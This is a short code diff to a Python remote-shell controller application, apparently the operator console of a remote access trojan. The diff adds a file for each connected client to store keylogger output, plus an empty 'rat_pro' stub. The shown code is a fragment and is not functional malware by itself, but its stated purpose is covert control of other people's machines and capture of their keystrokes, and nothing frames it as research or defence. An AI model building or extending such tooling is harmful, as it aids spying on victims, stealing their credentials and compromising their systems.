@@ -14,6 +14,7 @@ class ClientConnection:
         self.conn = conn
         self.addr = addr
         self.log_file = open(f"{addr[0]}_{addr[1]}.txt", "ab")
+        self.keyL_file = open(f"Keylog:{addr[0]}_{addr[1]}.txt", "ab")
         self.thread = None
 
 class ShellApp(App):
@@ -89,6 +90,14 @@ class ShellApp(App):
             self.query_one("#cmd_input", Input).value = ""
         except:
             self.query_one("#shell_log", Log).write("[ERROR] Failed to send command.\n")
+
+
+def rat_pro():
+    pass
+    
+
+
+
 
 if __name__ == "__main__":
     ShellApp().run()
